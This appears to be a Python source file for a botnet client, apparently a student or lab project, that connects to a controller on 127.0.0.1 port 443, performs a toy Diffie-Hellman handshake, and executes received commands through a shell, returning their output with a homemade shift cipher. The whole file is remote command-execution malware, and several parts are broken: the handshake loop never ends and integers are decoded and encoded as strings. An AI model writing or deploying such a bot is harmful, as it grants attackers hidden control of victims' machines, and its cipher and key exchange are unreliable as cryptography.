print("I'm the bot")

# Module Imports
import socket
import subprocess
import logging
import hashlib
import sys
########

# Logging declarations

LEVELS = { 'debug':logging.DEBUG,
            'info':logging.INFO,
            'warning':logging.WARNING,
            'error':logging.ERROR,
            'critical':logging.CRITICAL,
            }
log_out = 'debug'
level = LEVELS.get(log_out, logging.NOTSET)
logging.basicConfig(level=level)

##############

# Sending port configurations

send_host = "127.0.0.1"
send_port = 443
send_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

##############

# Functions

# Authentication Function

def encrypt(data, key):
    data = str(data)
    encrypted_out = ""
    # Reverse Cipher Encryption
    # ASCII Conversion
    for i in data:
        if (ord(i)) >= 65 and (ord(i) <= 90):
            std_out = (ord(i) + key)
            if std_out > 90:
                std_out = std_out % 90 + 64
            encrypted_out = encrypted_out + chr(std_out)
        elif (ord(i)) >= 97 and (ord(i) <= 122):
            std_out = (ord(i) + key)
            if std_out > 122:
                std_out = std_out % 122 + 96
            encrypted_out = encrypted_out + chr(std_out)
        else:
            encrypted_out = encrypted_out + chr(ord(i) + key)
    return encrypted_out


def decrypt(data, key):
    decrypted_out = ""
    # Reverse Cipher Decryption
    # ASCII Conversion
    for i in data:
        if ((ord(i)) >= 65) and (ord(i)) <= 90:
            decrypted_out = decrypted_out + chr((ord(i) - key - 65) % 26 + 65)
        elif ((ord(i)) >= 97) and (ord(i)) <= 122:
            decrypted_out = decrypted_out + chr((ord(i) - key - 97) % 26 + 97)
        else:
            decrypted_out = decrypted_out + chr(ord(i) - key)
    return decrypted_out

def auth():
    authkey = b"passkey"
    authkey = hashlib.sha1(authkey)
    authkey = authkey.hexdigest()
    send_socket.send(authkey.encode())


def connect():
    try:
        logging.debug(f"Connecting to controller....")
        send_socket.connect((send_host,send_port))
        logging.debug(f"Connection established with {send_host} on port {send_port}")

    except:
        logging.debug(f"Error connecting to {send_host} on port {send_port}")

def dh_recv_handshake():
    GR2 = [17, 8]
    dh_client_secret = 12
    cmd = send_socket.recv(1024)
    cmd = cmd.decode()
    if cmd == "GR2":
        logging.debug("HANDSHAKE GROUP IS DH2")
    elif cmd == "GR5":
        logging.debug("HANDSHAKE GROUP IS DH5")
    send_socket.send(b"CLIENT AGREED TO DH GROUP")
    dh_server_pub = send_socket.recv(1024)
    dh_server_pub = dh_server_pub.decode()
    dh_client_pub = (GR2[1] ** dh_client_secret) % GR2[0]
    dh_common_secret = (dh_server_pub ** dh_client_secret) % GR2[0]
    logging.debug(f"Calculated Asymmetric Code: {dh_common_secret}")
    dh_client_pub = (GR2[1] ** dh_client_secret) % GR2[0]
    #dh_client_pub = str(dh_client_pub)
    send_socket.send(dh_client_pub.encode())
    logging.debug(f"DH Client Public Code Sent {dh_client_pub}")
    return dh_common_secret

def recieve():
    #Negotiate DH
    while True:
        encryption_key = dh_recv_handshake()
    while True:
        try:
            cmd = send_socket.recv(1024)
            logging.debug(cmd)
            cmd = cmd.decode()
            cmd = decrypt(cmd,encryption_key)
            cmd = str(cmd)
            if cmd == '':
                main()
            execution = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE)
            std_out = execution.stdout.read() + execution.stderr.read()
            logging.debug(std_out)
            std_out = encrypt(std_out,encryption_key)
            logging.debug(f"Encrypted Data Sent to Server: {std_out}")
            send_socket.send(std_out)
        except:
            pass


def main():
    connect()
    #auth()  # Send Authentication Key
    logging.info("Authentication Initiated with Controller")
    while True:
        recieve()


main()

